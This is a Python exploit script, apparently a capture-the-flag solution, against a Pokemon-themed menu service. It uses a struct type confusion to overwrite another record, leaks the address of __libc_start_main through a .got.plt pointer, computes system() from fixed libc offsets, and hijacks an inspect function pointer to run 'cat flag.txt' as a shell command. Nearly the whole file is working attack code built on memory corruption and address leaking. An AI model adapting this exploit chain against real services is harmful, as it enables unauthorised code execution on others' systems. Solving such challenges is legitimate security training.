import re
import sys
import struct

sys.path.append('../../../tools')
import ctf_socket

HOST = 'arch'
PORT = 8888


def get_menu(cs):
    cs.recv_until('artwork', dump=False)


def catch(cs, poke_type=None, slot=2, name=None):
    while True:
        cs.send('1\n')
        data = cs.recv_until('(Run|artwork)')

        if 'artwork' not in data:
            if (poke_type is None) or (poke_type in data):
                if 'Kakuna' in data:
                    cs.send('2\n')
                    cs.recv_until('name')
                    cs.send('Kakuna\n')
                    get_menu(cs)
                    return 'Kakuna'
                elif 'Charizard' in data:
                    # Need to attack 4 times in order to capture the Charizard
                    for _ in xrange(4):
                        cs.send('1\n')
                        data = cs.recv_until('(Run|defeat)')

                        # Sometimes the attacks do more damage and defeat
                        # the charizard early. It's easiest to just continue
                        # trying until we get all the attack we want.
                        if 'defeat' in data:
                            break

                    if 'defeat' not in data:
                        cs.send('2\n')

                        # Overwrite slot
                        cs.recv_until('name')
                        cs.send('%s\n' % name)

                        cs.recv_until('5')
                        cs.send('%d\n' % slot)

                        get_menu(cs)
                        return 'Charizard'
            else:
                # Run
                cs.send('3\n')
                get_menu(cs)


def overwrite_kakuna_struct(cs, attack_name_pointer, inspect_fn, slot):
    """ Overwrite the structure for a Kakuna """
    # Now overwrite the inspect function @ offset 0x210
    cs.send('5\n')
    cs.recv_until('5')
    cs.send(str(slot))
    # Fill the artwork with NULLs so we dont get a bunch of fill back
    # when we inspect the pokemon
    cs.send('\x00' * 510, dump=True)
    cs.send(attack_name_pointer, dump=True)
    cs.send(inspect_fn, dump=True)
    cs.send('B' * 1611, dump=True) # Send junk to fill up the rest of the buffer
    get_menu(cs)

def main():
    cs = ctf_socket.CTFSocket(HOST, PORT, dump=False)
    get_menu(cs)

    pokemon = ['Bird Jesus']

    # Fill up the pokemon slots, the type confusing occurs
    # when we add a caught pokemon after all the slots have been filled
    while len(pokemon) != 5:
        pokemon.append(catch(cs, 'Kakuna'))

    # Charizard is the largest struct so it will allow us to overwrite
    # the values in any of the other pokemon structs
    pokemon[1] = catch(cs, poke_type='Charizard', slot=2, name='Charizard')

    # Leak the libc_start_main addr by changing the attack name pointer
    # to a pointer the .got.plt
    plt_libc_start_ptr = struct.pack('I', 0x80485D0+2)

    # The inspection function will print out *(*(attack_ptr))
    kakuna_inspect_fn = struct.pack('I', 0x8048766)
    overwrite_kakuna_struct(cs, plt_libc_start_ptr, kakuna_inspect_fn, 2)

    # Trigger the inspect function
    cs.send('3\n')
    data = cs.recv_until('artwork', dump=False)

    # Grab the leaked address from the second pokemon
    attack_string = re.findall('Attack: (.*)', data)[1]

    libc_start_main = struct.unpack('I', attack_string[:4])[0]
    print('libc_start_main=0x%X' % libc_start_main)

    # Now we can overwrite the inspect function with a call to system
    # A pointer to the pokemon struct is passed as the first argument
    # to the inspect function call. The name is at the start of the
    # pokemon struct so we can put our command in as the name of the
    # pokemon.

    # Calculated from arch linux's libc, for the real contest we'd
    # need to grab the libc some other way
    # 00017d80 T __libc_start_main
    # 0003b010 W system
    system = libc_start_main + (0x0003b010-0x0017d80)
    print('system=0x%X' % system)
    system = struct.pack('I', system)

    # Catch another Charizard so we can use slot 3, the name is the command
    # that gets executed
    pokemon[2] = catch(cs, poke_type='Charizard', slot=3, name='cat flag.txt')

    overwrite_kakuna_struct(cs, plt_libc_start_ptr, system, 3)
    cs.send('3\n')

    # And the output of the system call should be in data sent back
    data = cs.recv_until('artwork', dump=False)

if __name__ == '__main__':
    main()
